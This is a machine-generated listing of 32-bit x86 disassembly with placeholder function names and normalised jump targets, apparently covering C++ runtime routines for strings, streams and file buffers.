movzx eax [ ebp - 0x44 ]
push eax
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_412330
lea ecx [ ebp - 0x34 ]
push ecx
lea edx [ ebp - 0x11 ]
push edx
lea eax [ ebp - 0x12 ]
push eax
lea ecx [ ebp - 0x30 ]
push ecx
lea edx [ ebp - 0x6c ]
push edx
lea ecx [ ebp - 0x2c ]
call sub_4123e0
mov ecx eax
call sub_413dd0
mov esi eax
lea ecx [ ebp - 0x2c ]
call sub_401890
add esi eax
push esi
lea eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_4123e0
mov ecx eax
call sub_413dd0
push eax
mov ecx [ ebp - 0x38 ]
add ecx 0x48
push ecx
mov edx [ ebp - 0x38 ]
mov ecx [ edx + 0x40 ]
call sub_413fa0
mov [ ebp - 0x40 ] eax
cmp [ ebp - 0x40 ] 0x0
jl r-xdata
call sub_40cb50
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_401830
mov eax [ ebp - 0x58 ]
jmp r-xdata
call sub_40cb50
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x13 ]
push eax
call sub_40cac0
add esp 0x4
mov [ ebp - 0x48 ] eax
jmp r-xdata
call sub_40cb50
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_401830
mov eax [ ebp - 0x50 ]
jmp r-xdata
cmp [ ebp - 0x40 ] 0x1
jle r-xdata
mov eax [ ebp - 0x48 ]
jmp r-xdata
lea eax [ ebp - 0x12 ]
cmp [ ebp - 0x34 ] eax
je r-xdata
cmp [ ebp - 0x40 ] 0x3
je r-xdata
lea edx [ ebp - 0x60 ]
push edx
lea ecx [ ebp - 0x2c ]
call sub_4123e0
mov ecx eax
call sub_413dd0
mov ecx [ ebp - 0x30 ]
sub ecx eax
push ecx
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_401ba0
jmp r-xdata
lea ecx [ ebp - 0x68 ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_4123e0
mov ecx eax
call sub_413dd0
mov esi eax
lea ecx [ ebp - 0x2c ]
call sub_401890
add esi eax
sub esi [ ebp - 0x30 ]
mov [ ebp - 0x3c ] esi
lea ecx [ ebp - 0x2c ]
call sub_401890
cmp eax 0x1
jae r-xdata
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x12 ]
push ecx
call sub_40cac0
add esp 0x4
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_401830
mov eax [ ebp - 0x54 ]
jmp r-xdata
mov edx [ ebp - 0x3c ]
sub edx 0x1
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x38 ]
mov ecx [ eax + 0x50 ]
push ecx
mov edx [ ebp - 0x30 ]
add edx [ ebp - 0x3c ]
movsx eax [ edx ]
push eax
call sub_423e67
add esp 0x8
jmp r-xdata
push 0x1
lea edx [ ebp - 0x64 ]
push edx
lea ecx [ ebp - 0x2c ]
call sub_4123e0
mov ecx eax
call sub_413dd0
push eax
push 0x1
lea eax [ ebp - 0x12 ]
push eax
call sub_423a5b
add esp 0x10
lea ecx [ ebp - 0x12 ]
push ecx
call sub_40cac0
add esp 0x4
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_401830
mov eax [ ebp - 0x4c ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x38 ]
mov edx [ ecx + 0x50 ]
push edx
call sub_423b8d
add esp 0x4
mov [ ebp - 0x44 ] eax
cmp [ ebp - 0x44 ] 0xffffffff
jne r-xdata
cmp [ ebp - 0x3c ] 0x0
jle r-xdata
sub_411ac6
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_401830
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_411af0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
call sub_412e20
mov ecx [ ebp - 0x10 ]
add ecx 0x44
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x10 ]
cmp [ edx + 0x50 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
mov ecx [ r--data ]
push ecx
mov edx [ r--data ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_413ed0
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
call sub_413ac0
movzx eax al
test eax eax
je r-xdata
mov edx [ ebp - 0x10 ]
cmp [ edx + 0x40 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x14
mov ecx [ ebp + 0xc ]
or ecx [ ebp + 0x10 ]
jne r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x1
mov ecx [ ebp + 0x10 ]
sbb ecx 0x0
mov [ ebp + 0xc ] eax
mov [ ebp + 0x10 ] ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x50 ]
push eax
call sub_42417e
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x1
je r-xdata
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x50 ]
push eax
call sub_4242b1
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
call sub_413d10
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x48 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_413f10
mov eax [ ebp + 0x8 ]
sub_411be0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] ecx
lea ecx [ ebp + 0xc ]
call sub_413f50
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edx
lea ecx [ ebp + 0xc ]
call sub_413f70
sub eax [ ebp - 0xc ]
sbb edx [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov ecx [ r--data ]
push ecx
mov edx [ r--data ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_413ed0
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
call sub_413ac0
movzx ecx al
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x20
lea edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x50 ]
push ecx
call sub_424306
add esp 0x8
test eax eax
jne r-xdata
mov edx [ ebp - 0x18 ]
or edx [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x50 ]
push eax
call sub_4242b1
add esp 0x8
test eax eax
je r-xdata
push 0x1
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x50 ]
push eax
call sub_42417e
add esp 0x10
test eax eax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_401890
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x48 ] eax
mov ecx [ ebp - 0x10 ]
call sub_413d10
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x48 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_413f10
mov eax [ ebp + 0x8 ]
sub_411ce0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0xc ]
or ecx [ ebp + 0x10 ]
jne r-xdata
push 0x1
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x50 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_413a10
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x50 ]
push eax
call sub_42433f
add esp 0x10
test eax eax
je r-xdata
sub_411d50
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x0
call sub_40cb50
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
call eax
mov [ ebp - 0xc ] eax
call sub_40cb50
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
call sub_40cad0
add esp 0x8
movzx eax al
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x50 ]
push edx
call sub_4244f8
add esp 0x4
test eax eax
jge r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_411dd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_416a20
add esp 0x4
push eax
mov ecx [ ebp - 0x4 ]
call sub_413cd0
mov esp ebp
pop ebp
retn 0x4
sub_411e00
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax ]
cmp edx [ ecx ]
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_411e30
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_411e00
movzx ecx al
test ecx ecx
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_411e70
push ebp
mov ebp esp
push 0xffffffff
push sub_43b362
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push 0x0
push 0x0
mov edx [ ebp - 0x10 ]
add edx 0x4
push edx
mov ecx [ ebp - 0x10 ]
call sub_410350
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ eax + edx ] r--data
mov ecx [ ebp - 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
sub eax 0x60
mov ecx [ ebp - 0x10 ]
mov edx [ ecx ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x10 ]
add ecx 0x4
call sub_413840
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
or ecx 0x2
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40be90
push eax
mov ecx [ ebp - 0x10 ]
add ecx 0x4
call sub_4138e0
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x10 ]
add ecx 0x60
call sub_412740
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
or ecx 0x1
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x10
push 0x0
push 0x2
mov edx [ ebp - 0x10 ]
mov eax [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx [ eax + 0x4 ]
call sub_410690
sub_411f80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax - 0x60 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx - 0x60 ] r--data
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x60 ]
mov eax [ edx + 0x4 ]
sub eax 0x60
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x60 ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx - 0x64 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x5c
call sub_411250
mov ecx [ ebp - 0x4 ]
sub ecx 0x58
call sub_410410
mov esp ebp
pop ebp
retn
sub_412000
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x4
call sub_4139a0
test eax eax
jne r-xdata
mov esp ebp
pop ebp
retn
push 0x0
push 0x2
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_410690
sub_412030
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
sub ecx 0x8
call sub_40deb0
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x8
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
sub ecx 0x8
push ecx
call j_sub_422732#2
add esp 0x4
sub_412070
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_410670
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_4120a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
sub ecx 0x18
call sub_412210
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x18
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
sub ecx 0x18
push ecx
call j_sub_422732#2
add esp 0x4
sub_4120e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_410860
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_412110
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40d130
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_412160
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
sub ecx 0x70
call sub_40e520
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x70
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
sub ecx 0x70
push ecx
call j_sub_422732#2
add esp 0x4
sub_4121a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_411250
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call j_sub_422732#2
add esp 0x4
sub_4121d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
sub ecx 0x60
call sub_40e810
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x60
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
sub ecx 0x60
push ecx
call j_sub_422732#2
add esp 0x4
sub_412210
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x18
call sub_4106e0
mov ecx [ ebp - 0x4 ]
add ecx 0x18
call sub_410670
mov esp ebp
pop ebp
retn
sub_412240
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x1 ]
call sub_401a30
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a40
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_401990
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_414240
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_412280
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x10
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_402130
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
add edx 0x1
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
call sub_4010a0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
mov [ eax + 0x14 ] edx
push 0x0
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_401990
mov esp ebp
pop ebp
retn 0x4
sub_412300
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_401020
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_414190
mov esp ebp
pop ebp
retn 0x4
sub_412330
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ r--data ]
sub ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
ja r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
add eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401c70
movzx edx al
test edx edx
je r-xdata
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_4142a0
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401c30
sub_4123b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ r--data ]
push eax
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_4018b0
mov esp ebp
pop ebp
retn 0x4
sub_4123e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
push eax
mov ecx [ ebp + 0x8 ]
call sub_414d60
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_412410
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_414d60
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_412440
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
cmp eax [ edx + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ eax + 0x10 ]
ja r-xdata
mov eax [ r--data ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
sub ecx 0x1
mov edx [ ebp - 0x4 ]
sub edx ecx
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x8 ]
call sub_401ab0
add eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
call sub_40ca50
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
call sub_40ca10
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
call sub_401ab0
mov ecx [ ebp - 0xc ]
sub ecx eax
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
add eax 0x1
mov ecx [ ebp - 0x4 ]
sub ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0x10 ] edx
sub_412520
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0x8 ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov edx [ ebp - 0xc ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401ab0
add eax [ ebp + 0x8 ]
push eax
call sub_40ca10
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x14 ]
jne r-xdata
mov [ ebp - 0x14 ] 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov esp ebp
pop ebp
retn 0x10
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] edx
sub_4125e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
call sub_422732
add esp 0x4
sub_412610
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edx
mov ecx [ ebp + 0x8 ]
or ecx 0x4
mov [ ebp - 0x4 ] ecx
jmp r-xdata
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_40d980
mov esp ebp
pop ebp
retn 0x8
sub_412650
push ebp
mov ebp esp
push 0xffffffff
push sub_43bbd8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_40db80
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp - 0x18 ]
push edx
call sub_416150
add esp 0x4
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call sub_40d130
movzx eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x20 ]
call sub_40d420
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_4126d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40dc00
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x38 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x3c ] 0x0
push 0x20
mov ecx [ ebp - 0x4 ]
call sub_412650
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x40 ] al
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x38 ] 0x0
jne r-xdata
movzx eax [ ebp + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x4
mov ecx [ ebp - 0x4 ]
call sub_410690
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x4 ]
push ecx
call sub_421c7c
add esp 0x4
sub_412760
push ebp
mov ebp esp
push 0xffffffff
push sub_43b30c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] 0x0
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx ] r--data
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x18
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
mov eax [ ecx + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + eax - 0x4 ] edx
mov edx [ ebp - 0x10 ]
mov [ edx + 0x8 ] 0x0
mov [ edx + 0xc ] 0x0
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx [ eax + 0x4 ]
call sub_4126d0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0x10 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x10 ]
add ecx 0x18
call sub_412740
mov [ ebp - 0x4 ] 0x0
